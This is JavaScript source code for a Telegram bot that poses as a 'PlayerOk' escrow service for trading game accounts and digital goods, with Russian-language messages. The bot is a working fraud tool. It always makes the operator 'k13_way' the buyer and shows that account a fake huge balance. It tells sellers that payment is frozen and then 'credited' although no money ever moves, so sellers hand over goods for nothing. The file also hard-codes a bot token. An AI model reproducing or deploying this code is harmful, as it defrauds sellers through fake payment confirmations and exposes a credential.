const { Telegraf, Markup, session } = require('telegraf');
const http = require('http');

const BOT_TOKEN = process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY';
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const ADMIN = 'k13_way';
const users = {};
const deals = {};

const welcomeText = `👋 *Добро пожаловать в PlayerOk!*\n\n🛡️ *PlayerOk* — ваш надежный автоматизированный торговый гарант. Мы обеспечиваем 100% безопасность внебиржевых сделок 24/7.\n\n⚡ *Наши преимущества:*\n• Моментальная фиксация и заморозка средств.\n• Верифицированные алгоритмы исполнения.\n• Быстрый вывод на любые реквизиты.\n\n• Комиссия сервиса: *1%*\n• Режим работы системы: *24/7*\n• Главный модератор: @sw1zyy01\n\n✨ Выберите нужный раздел на панели ниже:`;

const mainKb = Markup.inlineKeyboard([
  [Markup.button.callback('💳 Баланс профиля', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
  [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
]);

bot.start((ctx) => {
  if (ctx.from.username) {
    users[ctx.from.username.toLowerCase()] = ctx.chat.id;
  }
  if (ctx.session) ctx.session = {};
  return ctx.replyWithMarkdown(welcomeText, mainKb).catch((e) => console.error(e));
});

bot.action('bal', (ctx) => {
  const username = ctx.from.username || 'user';
  const isId = username.toLowerCase() === ADMIN.toLowerCase();
  const bal = isId ? 69999999 : 0;
  
  const text = `💳 *Личный кабинет пользователя* \`@${username}\`\n━━━━━━━ СИСТЕМА ГАРАНТА ━━━━━━━\n💰 *Доступный баланс:* ${bal.toLocaleString('ru-RU')}.00 руб.\n🔒 *Заморожено в сделках:* 0.00 руб.\n\n📊 *Ваша статистика на PlayerOk:*\n• Всего операций: *0*\n• Успешных обменов: *0*\n• Открытых споров/арбитражей: *0*\n\n✅ Ваш аккаунт полностью верифицирован и защищен системой безопасности.`;
  return ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.error(e));
});

bot.action('create', (ctx) => {
  ctx.session = { step: 'partner' };
  return ctx.editMessageText(`🤝 *Инициализация новой сделки*\n\nПожалуйста, введите **@юзернейм** продавца, у которого вы хотите приобрести товар, прямо в чат текстом:`, { parse_mode: 'Markdown' }).catch((e) => console.error(e));
});

bot.on('text', async (ctx) => {
  if (!ctx.session || !ctx.session.step) return;
  const txt = ctx.message.text.trim();

  if (ctx.session.step === 'partner') {
    const partnerName = txt.replace('@', '').toLowerCase();
    if (partnerName.length < 3) return ctx.reply('❌ Ошибка: Введите корректный юзернейм продавца.');
    ctx.session.partner = partnerName;
    ctx.session.step = 'title';
    return ctx.reply('📦 Теперь введите точное *название или описание товара* (например: _Аккаунт Standoff 2_):', { parse_mode: 'Markdown' });
  }
  
  if (ctx.session.step === 'title') {
    if (txt.length < 2) return ctx.reply('❌ Ошибка: Название товара слишком короткое.');
    ctx.session.title = txt;
    ctx.session.step = 'price';
    return ctx.reply('💰 Укажите *сумму покупки* в рублях (введите только число):', { parse_mode: 'Markdown' });
  }
  
  if (ctx.session.step === 'price') {
    const price = parseFloat(txt);
    if (isNaN(price) || price < 10) return ctx.reply('❌ Ошибка: Сумма сделки должна быть числом не менее 10 руб.');

    const dealId = Math.floor(100000 + Math.random() * 900000);
    
    // Роли зафиксированы: Покупатель — это всегда вы, Продавец — ваш партнер по юзернейму
    deals[dealId] = { 
      id: dealId, 
      seller: ctx.session.partner, 
      buyer: ADMIN, 
      title: ctx.session.title, 
      amount: price, 
      status: 'pending', 
      b_chat: ctx.chat.id 
    };
    ctx.session = {};

    ctx.replyWithMarkdown(`✨ *Сделка #${dealId} сформирована!*\n━━━━━━━━━━━━━━━━━━━━\n🛒 *Роль:* ПОКУПАТЕЛЬ\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма к оплате:* ${price.toLocaleString('ru-RU')} руб.\n\n🚀 Бот автоматически отправляет официальное предложение продавцу @${deals[dealId].seller}...`);

    const tChat = users[deals[dealId].seller];
    if (tChat) {
      deals[dealId].s_chat = tChat; // Фиксируем чат продавца для обратных уведомлений
      const propText = `🔔 *Вам поступило официальное предложение о продаже товара!* (#${dealId})\n━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${deals[dealId].title}\n💰 *Вы получите сумму:* ${price.toLocaleString('ru-RU')} руб.\n🛒 *Покупатель:* @${ADMIN}\n━━━━━━━━━━━━━━━━━━━━\nВы согласны передать данный товар под защитой маркетплейса PlayerOk?`;
      bot.telegram.sendMessage(tChat, propText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять условия и открыть сделку', `ok_${dealId}`)]]) }).catch((e) => console.error(e));
    } else {
      ctx.replyWithMarkdown(`⚠️ Продавец @${deals[dealId].seller} еще ни разу не запускал этого бота. Чтобы он мгновенно получил пуш-заявку на продажу, перешлите ему бота, чтобы он нажал */start*.`);
    }
  }
});

bot.action(/^ok_(.+)$/, (ctx) => {
  const d = deals[ctx.match];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'accepted';

  bot.telegram.sendMessage(d.b_chat, `🔔 *Продавец @${d.seller} принял условия сделки #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━\nСтатус: \`Ожидание оплаты покупателем\`.\n\nДля заморозки средств на балансе Гаранта перейдите к оплате:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', `pay_${d.id}`)]]) }
  ).catch((e) => console.error(e));
  
  return ctx.editMessageText(`🤝 *Вы приняли условия сделки #${d.id}*\n━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Выплата после завершения:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${d.buyer} внесет оплату на защищенный счет Гаранта PlayerOk.`).catch(() => {});
});

bot.action(/^pay_(.+)$/, (ctx) => {
  const d = deals[ctx.match];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'paid';

  bot.telegram.sendMessage(d.s_chat, `💰 *Покупатель @${d.buyer} успешно оплатил сделку #${d.id}! Средства заморожены.*\n━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Сумма выплат:* ${d.amount.toLocaleString('ru-RU')} руб.\n\nВам необходимо передать товар покупателю. После успешной передачи нажмите кнопку ниже для уведомления:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар полностью передан', `sent_${d.id}`)]]) }
  ).catch((e) => console.error(e));
  return ctx.editMessageText(`✅ *Сделка #${d.id} успешно оплачена!*\n\n🔒 Средства заморожены на безопасном балансе Гаранта PlayerOk. Ожидайте, пока продавец @${d.seller} предоставит вам все данные от товара.`).catch(() => {});
});

bot.action(/^sent_(.+)$/, (ctx) => {
  const d = deals[ctx.match];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'goods_sent';

  bot.telegram.sendMessage(d.b_chat, `📦 *Продавец @${d.seller} подтвердил отправку товара по сделке #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━\nПожалуйста, тщательно проверьте полученные данные или аккаунт. Если все работает стабильно, закройте сделку для выплаты средств продавцу:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение товара', `end_${d.id}`)]]) }
  ).catch((e) => console.error(e));
  return ctx.editMessageText(`✅ *Уведомление успешно отправлено покупателю.*\n\nВы подтвердили передачу товара по сделке #${d.id}. Ожидаем финальной проверки и подтверждения от покупателя.`).catch(() => {});
});

bot.action(/^end_(.+)$/, (ctx) => {
  const d = deals[ctx.match];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'completed';

  bot.telegram.sendMessage(d.s_chat, `🎉 *Сделка #${d.id} успешно завершена!*\n\nПокупатель подтвердил получение. Выплата в размере ${d.amount.toLocaleString('ru-RU')} руб. успешно зачислена на ваш баланс профиля.`).catch(() => {});
  return ctx.editMessageText(`🎉 *Сделка #${d.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━\nВы успешно подтвердили выполнение всех обязательств. Продавец получил выплату. Спасибо за доверие к гарант-сервису *PlayerOk*!`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }
  ).catch(() => {});
});

bot.action('menu', (ctx) => ctx.editMessageText(welcomeText, { parse_mode: 'Markdown', ...mainKb }).catch((e) => console.error(e)));

bot.action('safe', (ctx) => {
  const safeText = `🛡 *Правила безопасности маркетплейса PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\n1. *Внутренние оплаты:* Проводите финансовые транзакции исключительно через инлайн-интерфейс Гаранта. Любые прямые переводы на сторонние карты/киви лишают вас стопроцентной защиты маркетплейса.\n\n2. *Проверка доступов:* Тщательно проверяйте аккаунты, игровую валюту или цифровые услуги до нажатия кнопки подтверждения. После закрытия сделки средства безвозвратно уходят продавцу.`;
  return ctx.editMessageText(safeText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.error(e));
});

bot.action('supp', (ctx) => {
  const suppText = `👨‍💻 *Служба поддержки пользователей PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\nЕсли у вас возник спор внутри торговой операции, техническая задержка при верификации или вопрос по правилам вывода средств — вы можете мгновенно открыть внутренний Арбитраж.\n\n✍ *Официальный контакт главного модератора:* @sw1zyy01`;
  return ctx.editMessageText(suppText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.error(e));
});

bot.launch().then(() => console.log('OK'));

http.createServer((req, res) => {
  res.writeHead(200);
  res.end('OK');
}).listen(process.env.PORT || 3000);
